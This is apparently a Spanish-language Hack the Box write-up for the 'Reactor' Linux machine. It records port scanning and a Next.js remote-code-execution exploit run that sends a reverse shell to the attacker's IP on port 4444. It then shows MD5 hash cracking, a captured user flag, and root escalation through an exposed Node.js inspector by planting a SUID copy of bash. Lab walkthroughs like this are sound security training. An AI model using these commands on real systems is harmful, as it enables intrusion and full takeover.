---
title: Hack the box- Reactor
date: 2026-09-26
platform: Hack the box
difficulty: Easy
os: Linux
tags:
  - RCE
  - NextJS
  - MD5
status: ""
---

# Resumen Ejecutivo
**IP Objetivo:** `10.129.245.214`
**Descripción breve:** 

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos con [[Nmap]]
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.129.245.214 -n -Pn -oN escaneo
```

**Puertos Abiertos:**
- 22 ([[SSH]]), 3000 (Desarrollo)

### Enumeración de Servicios / Fuzzing
```bash

```

**Descubrimientos clave:**
- Ninguno

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
- Buscamos la version de [[NEXT JS|Next]] en la que esta creada la aplicación (15.0.3)
- Encontramos el CVE-2025-66478 para ejecutar un [[RCE]]

---

## 3. Exploitation (Acceso Inicial)

### Metodología
1. Intentamos ejecutar un script para explotar la vulnerabilidad [[RCE]]
2. Colocamos un puerto en escucha en `4444` con netcat para ver que sucede
3. Intentamos ejecutar comandos de terminal justamente ejecutando el script

### Ejecución
```bash
node react2shell.js http://reactor.htb:3000 shell 10.10.14.5 4444
```

- Al entrar nos encontramos un archivo [[SQLITE 3]] y accedimos a el
- al descifrar las contraseñas [[MD5]] logramos conectarnos por [[SSH]] a uno de los usuarios
**Prueba de acceso (User Flag):**
```bash
c22002fee26e397a94ead78fb8587957
```

---

## 4. Privilege Escalation (Escalada de Privilegios)

### Enumeración Interna
- vemos los [[Escaladas de privilegios#Buscar otros usuarios para ver que procesos hay|procesos]] en segundo pplano de cada uno de los usuarios y nos damos cuenta que hay un proceso de node con `--inspect=127.0.0.1:9229` Esto activa el **inspector de Node.js**, una herramienta de depuración que permite conectarse y ejecutar código JavaScript en ese proceso.

### Explotación Local
1.  utilizamos este comando: `node inspect 127.0.0.1:9229` para conectarnos a esa shell
2. nos conectamos y tenemos acceso a al inspector del proceso Node.js que corre como root.
3. podemos ejecutar codigo javascript en esa consola

### Ejecución
```bash
exec("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")
```

luego de salir de esa consola, ejecutamos esto para [[Escaladas de privilegios#Binarios SUID|subir privilegios]]

```bash
/tmp/rootbash -p
```

**Prueba de acceso (Root/SYSTEM Flag):**
```bash

```

---
